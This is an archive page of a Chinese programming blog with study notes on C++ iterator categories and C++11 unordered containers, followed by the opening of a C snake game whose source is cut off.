<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>第 11 页 | coordinate</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
  
  
  
  <meta property="og:type" content="website">
<meta property="og:title" content="coordinate">
<meta property="og:url" content="http://coordinate.wang/page/11/index.html">
<meta property="og:site_name" content="coordinate">
<meta property="og:locale" content="zh-CN">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="coordinate">
  
    <link rel="alternate" href="/atom.xml" title="coordinate" type="application/atom+xml">
  
  <link rel="icon" href="/css/images/favicon.ico">
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
  <style type="text/css">
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
    
  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">

  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Oswald%3A300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
  <link rel="stylesheet" href="/css/style.css">

  <script src="/js/jquery-3.1.1.min.js"></script>

  <!-- Bootstrap core CSS -->
  <link rel="stylesheet" href="/css/bootstrap.css" >
  <link rel="stylesheet" href="/css/fashion.css" >
  <link rel="stylesheet" href="/css/glyphs.css" >

</head>



  <body>


  


<header id="allheader" class="site-header" role="banner" 
   >
  <div class="clearfix container">
      <div class="site-branding">

          <h1 class="site-title">
            
              <a href="/" title="coordinate" rel="home"> coordinate </a>
            
          </h1>
          
          
            
          <nav id="main-navigation" class="main-navigation" role="navigation">
            <a class="nav-open">Menu</a>
            <a class="nav-close">Close</a>

            <div class="clearfix sf-menu">
              <ul id="main-nav" class="menu sf-js-enabled sf-arrows"  style="touch-action: pan-y;">
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/">首页</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/archives">归档</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/categories">分类</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/tags">标签</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/about">关于</a> </li>
                    
              </ul>
            </div>
          </nav>

      </div>
  </div>
</header>


  <div id="container">
    <div id="wrap">
            
      <div id="content" class="outer">
        
          <section id="main">
  
    <article id="post-2017-05-26-迭代器种类"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2017/05/26/2017-05-26-迭代器种类/">迭代器种类</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2017/05/26/2017-05-26-迭代器种类/" class="article-date">
	  <time datetime="2017-05-25T16:00:00.000Z" itemprop="datePublished">五月 26, 2017</time>
	</a>

      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/cpp/">cpp</a>
 
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Output迭代器"><a href="#Output迭代器" class="headerlink" title="Output迭代器"></a>Output迭代器</h2><p>输出迭代器（OutputIterator）是能写入所指元素的迭代器（Iterator）。<br>实现输出迭代器（OutputIterator）的类型的例子是 std::ostream_iterator。<br>当向前迭代器（ForwardIterator）、双向迭代器（BidirectionalIterator）或随机访问迭代器（RandomAccessIterator）在自身的要求之上满足的输出迭代器（OutputIterator）要求时，它被描述为可变的。  </p>
<h2 id="Input迭代器"><a href="#Input迭代器" class="headerlink" title="Input迭代器"></a>Input迭代器</h2><p>输入迭代器（InputIterator）是能从所指向元素读取的迭代器（Iterator）。输入迭代器（InputIterator）仅保证单趟算法的合法性：一旦 InputIterator i 被自增，则所有其先前值的副本都可能变得非法。<br>Input迭代器只能读取元素一次。如果你复制input迭代器，并令源input迭代器和新产生的拷贝都向前读取，可能会遍历到不同的值。  </p>
<h2 id="Forward（前向）迭代器"><a href="#Forward（前向）迭代器" class="headerlink" title="Forward（前向）迭代器"></a>Forward（前向）迭代器</h2><p>向前迭代器（ForwardIterator）是一种能从所指向元素读取数据的迭代器（Iterator）。<br>不同于输入迭代器（InputIterator）和输出迭代器（OutputIterator），它能被用于多趟算法。<br>和input迭代器不同的是，两个forward迭代器如果指向同一个元素，operator==会获得true，如果两者都递增，会再次指向同一元素。<br>有以下对象和类型提供：  </p>
<ol>
<li>class forward_list&lt;&gt;</li>
<li>unordered容器</li>
</ol>
<h2 id="Bidirectional（双向迭代器）"><a href="#Bidirectional（双向迭代器）" class="headerlink" title="Bidirectional（双向迭代器）"></a>Bidirectional（双向迭代器）</h2><p>双向迭代器（BidirectionalIterator）是能双向移动（即自增与自减）的向前迭代器（ForwardIterator）。<br>有以下对象和类型提供：  </p>
<ol>
<li>class list&lt;&gt;</li>
<li>associative容器</li>
</ol>
<h2 id="RandomAccess（随机访问）迭代器"><a href="#RandomAccess（随机访问）迭代器" class="headerlink" title="RandomAccess（随机访问）迭代器"></a>RandomAccess（随机访问）迭代器</h2><p>随机访问迭代器（RandomAccessIterator）是能在常数时间内移动到指向任何元素的双向迭代器（BidirectionalIterator）。<br>指向数组元素的指针满足所有随机访问迭代器（RandomAccessIterator）的要求。<br>有以下对象和类型提供：  </p>
<ol>
<li>可随机访问的容器（array、vector、deque）</li>
<li>string（string、wstring）</li>
<li>寻常的c-style（pointer）</li>
</ol>
<h2 id="Vector迭代器的increment和decrement"><a href="#Vector迭代器的increment和decrement" class="headerlink" title="Vector迭代器的increment和decrement"></a>Vector迭代器的increment和decrement</h2><p>一般而言你可以递增或递减临时性迭代器，但对于array、vector和string就不行。例子：  </p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; coll;</span><br><span class="line"><span class="keyword">if</span>(coll.size() &gt; <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">std</span>::sort(++coll.begin(), coll.end());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译++coll.begin可能会失败，但是如果使用的是deque就不会。原因是，vector、array和string的迭代器通常被实现为寻常pointer，而C++并不允许你修改任何基础类型的临时类型（包括pointer）的临时对象，但对于struct和class就允许。<br>因此，上面的代码对于vector、array和string以外的容器都没问题，因为那些容器的迭代器都不可能是寻常pointer。但对于vector、array和string，上面的代码是否可行就取决于具体实现。<br>在c++11之前的做法是使用一个辅助对象::  </p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; coll;</span><br><span class="line"><span class="keyword">if</span>(coll.size() &gt; <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">std</span>:<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::iterator beg = coll.begin();</span><br><span class="line">	<span class="built_in">std</span>::sort(++beg, coll.end());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>C++11之后可以使用next   </p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; coll;</span><br><span class="line"><span class="keyword">if</span>(coll.size() &gt; <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">std</span>::sort(<span class="built_in">std</span>::next(coll.begin()), coll.end());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="entry-meta entry-footer">
      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/cpp/">cpp</a>

      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cpp/">cpp</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cpp标准库/">cpp标准库</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/notes/">notes</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/迭代器/">迭代器</a></li></ul>

      
    </footer>
    <hr class="entry-footer-hr">
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-2017-05-25-STL容器8无序容器"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2017/05/25/2017-05-25-STL容器8无序容器/">STL容器（8）无序容器</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2017/05/25/2017-05-25-STL容器8无序容器/" class="article-date">
	  <time datetime="2017-05-24T16:00:00.000Z" itemprop="datePublished">五月 25, 2017</time>
	</a>

      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/cpp/">cpp</a>
 
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>定义于头文件\&lt;unordered_set>  </p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Key</span>,</span></span><br><span class="line"><span class="class">    <span class="title">class</span> <span class="title">Hash</span> = <span class="title">std</span>:</span>:hash&lt;Key&gt;,</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">KeyEqual</span> = <span class="title">std</span>:</span>:equal_to&lt;Key&gt;,</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Allocator</span> = <span class="title">std</span>:</span>:allocator&lt;Key&gt;</span><br><span class="line">&gt; <span class="class"><span class="keyword">class</span> <span class="title">unordered_set</span>;</span></span><br></pre></td></tr></table></figure>
<p>(C++11 起)<br>无序集合是一个关联容器，包含一些类型为Key的唯一对象。搜索，插入和删除具有平摊的常数时间复杂度。<br>定义于头文件\&lt;unordered_set>  </p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Key</span>,</span></span><br><span class="line"><span class="class">    <span class="title">class</span> <span class="title">Hash</span> = <span class="title">std</span>:</span>:hash&lt;Key&gt;,</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">KeyEqual</span> = <span class="title">std</span>:</span>:equal_to&lt;Key&gt;,</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Allocator</span> = <span class="title">std</span>:</span>:allocator&lt;Key&gt;</span><br><span class="line">&gt; <span class="class"><span class="keyword">class</span> <span class="title">unordered_multiset</span>;</span></span><br></pre></td></tr></table></figure>
<p>(C++11 起)<br>无序多重集合是一个关联容器，含有一些类型为Key的，可能不是唯一的对象。搜索，插入和删除具有平摊的常数时间复杂度。<br>定义于头文件 \&lt;unordered_map>  </p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Key</span>,</span></span><br><span class="line"><span class="class">    <span class="title">class</span> <span class="title">T</span>,</span></span><br><span class="line"><span class="class">    <span class="title">class</span> <span class="title">Hash</span> = <span class="title">std</span>:</span>:hash&lt;Key&gt;,</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">KeyEqual</span> = <span class="title">std</span>:</span>:equal_to&lt;Key&gt;,</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Allocator</span> = <span class="title">std</span>:</span>:allocator&lt; <span class="built_in">std</span>::pair&lt;<span class="keyword">const</span> Key, T&gt; &gt;</span><br><span class="line">&gt; <span class="class"><span class="keyword">class</span> <span class="title">unordered_map</span>;</span></span><br></pre></td></tr></table></figure>
<p>(C++11 起)<br>无序映射是一个关联容器，包含带有唯一键的键值对。搜索，插入和去除具有平摊的常数时间复杂度。<br>定义于头文件 \&lt;unordered_map>  </p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Key</span>,</span></span><br><span class="line"><span class="class">    <span class="title">class</span> <span class="title">T</span>,</span></span><br><span class="line"><span class="class">    <span class="title">class</span> <span class="title">Hash</span> = <span class="title">std</span>:</span>:hash&lt;Key&gt;,</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">KeyEqual</span> = <span class="title">std</span>:</span>:equal_to&lt;Key&gt;,</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Allocator</span> = <span class="title">std</span>:</span>:allocator&lt; <span class="built_in">std</span>::pair&lt;<span class="keyword">const</span> Key, T&gt; &gt;</span><br><span class="line">&gt; <span class="class"><span class="keyword">class</span> <span class="title">unordered_multimap</span>;</span></span><br></pre></td></tr></table></figure>
<p>(C++11 起)<br>无序多重映射是一个无序关联容器，支持多个相等的键（unordered_multimap中，每个键对应的值可能不唯一）以及相关联的另一种类型的值。unordered_multimap类支持前向迭代器。搜索，插入和去除具有平摊的常数时间复杂度。  </p>
<h2 id="Unordered容器能力"><a href="#Unordered容器能力" class="headerlink" title="Unordered容器能力"></a>Unordered容器能力</h2><p>Unordered容器比起寻常的associative容器，要的优点是：在安插、删除、查找元素时获得amortized常量时间，因为偶尔发生的rehashing可能是个大型操作。主要缺点是：Unordered容器不提供operator&lt;、&gt;、&lt;=和&gt;=这些容器的多重实例。不提供lower_bound和upper_bound。由于iterator只保证至少是个forward iterator，所以别的迭代器的算法都是用不了。<br>由于元素的(key)value关系到元素的位置，所以不可以直接修改(key)value，通过iterator访问时，元素的(key)value是常量。<br>Erase函数不会造成指向元素的iterator、reference和pointer失效。在调用insert、reserve和clear、rehash时会rehashing。  </p>
<h2 id="创建和控制Unordered容器"><a href="#创建和控制Unordered容器" class="headerlink" title="创建和控制Unordered容器"></a>创建和控制Unordered容器</h2><p>欲定义最大负载系数，你必须在构建后立刻调用一个成员函数：  </p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">unordered_set</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt; coll;</span><br><span class="line">coll.max_load_factor(<span class="number">0.7</span>);</span><br></pre></td></tr></table></figure>
<p>通常0.7~0.8是速度和内存消耗量之间一个不错的折中。默认的最大负载系数时1.0，意思是通常碰撞会发生在rehash之前。<br>reverse与rehash的区别在于：如果在大负载系数时0.7而你打算准备100个元素，你必须将100初一0.7。也就是你必须传入143给rehash以避免在最高达到100个元素的情况下出现进一步rehash。如果使用reverse，这一计算是内部进行的额，所以你可以仅仅传递hashtable应该筹备的元素个数：<br>rehash：Sets the number of buckets to count and rehashes the container, i.e. puts the elements into appropriate buckets considering that total number of buckets has changed. If the new number of buckets makes load factor more than maximum load factor (count &lt; size() / max_load_factor()), then the new number of buckets is at least size() / max_load_factor().<br>reverse：Sets the number of buckets to the number needed to accomodate at least count elements without exceeding maximum load factor and rehashes the container, i.e. puts the elements into appropriate buckets considering that total number of buckets has changed. Effectively calls rehash(std::ceil(count / max_load_factor())).  </p>
<h2 id="Unordered容器的其他操作"><a href="#Unordered容器的其他操作" class="headerlink" title="Unordered容器的其他操作"></a>Unordered容器的其他操作</h2><p>Unordered左右两端容器必须有相同类型，更明确地说是其hash function的类型以及equivalence criterion(等价标准)必须相同，即使hash函数本身可能不同。<br>与map/multimap对应的是unordered map/multimap的元素类型是pair<const key,="" t="">，意味着你需要first和second才能范文一个元素的key和value。  </const></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> elem&amp; : coll)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"key："</span> &lt;&lt; elem.first &lt;&lt; <span class="string">"\t"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>改变key的值会导致错误，改变元素的value就没问题，只要elem是个non-const reference且value的类型不是const：  </p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">elem.second = <span class="number">13.5</span>;</span><br></pre></td></tr></table></figure>
<p>如果你是用算法和lambda来操作map内的元素，你必须明确元素类型，可以查看<a href="http://www.coordinate.wang/cpp/2017/04/29/STL%E5%AE%B9%E5%99%A87Map%E5%92%8CMutimap.html" target="_blank" rel="noopener">map的例子</a><br>一般而言，erasing函数并不会令“指向至其他元素”的iterator和reference失效。然而成员函数insert和emplace有可能令所有iterator失效，当rehashing发生，尽管指向元素的reference将总是保持有效。rehashing之所以发生，是由于一次安插动作造成最终元素的个数大于等于bucket数量乘以最大负载系数。insert和emplace成员函数不会影响指向容器元素的reference的有效性。  </p>

      
    </div>
    <footer class="entry-meta entry-footer">
      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/cpp/">cpp</a>

      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cpp/">cpp</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cpp标准库/">cpp标准库</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/notes/">notes</a></li></ul>

      
    </footer>
    <hr class="entry-footer-hr">
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-2017-05-24-多种语言实现贪吃蛇（c）"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2017/05/24/2017-05-24-多种语言实现贪吃蛇（c）/">多种语言实现贪吃蛇（c）</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2017/05/24/2017-05-24-多种语言实现贪吃蛇（c）/" class="article-date">
	  <time datetime="2017-05-23T16:00:00.000Z" itemprop="datePublished">五月 24, 2017</time>
	</a>

      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/c/">c</a>
 
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**************************************************************************************************************</span></span><br><span class="line"><span class="comment">**文件:snake.c</span></span><br><span class="line"><span class="comment">**编写者:coordinate</span></span><br><span class="line"><span class="comment">**编写日期:2017_6_2</span></span><br><span class="line"><span class="comment">**简要描述:贪吃蛇游戏</span></span><br><span class="line"><span class="comment">**运行环境:vs2015</span></span><br><span class="line"><span class="comment">**************************************************************************************************************/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> length 30 <span class="comment">// map length</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> width 30  <span class="comment">// map width</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//map</span></span><br><span class="line"><span class="keyword">int</span> <span class="built_in">map</span>[length][width] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//gameover flag</span></span><br><span class="line"><span class="keyword">int</span> gameover = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//time status</span></span><br><span class="line"><span class="keyword">char</span> status;</span><br><span class="line"><span class="keyword">int</span> sleepTime = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//food coordiante</span></span><br><span class="line"><span class="keyword">int</span> food[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//snake struct</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">SNAKE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">int</span> x;</span><br><span class="line">	<span class="keyword">int</span> y;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">SNAKE</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;snake;</span><br><span class="line"></span><br><span class="line">snake *head;	<span class="comment">//snake head</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">createMap</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">createSnake</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">makeFood</span><span 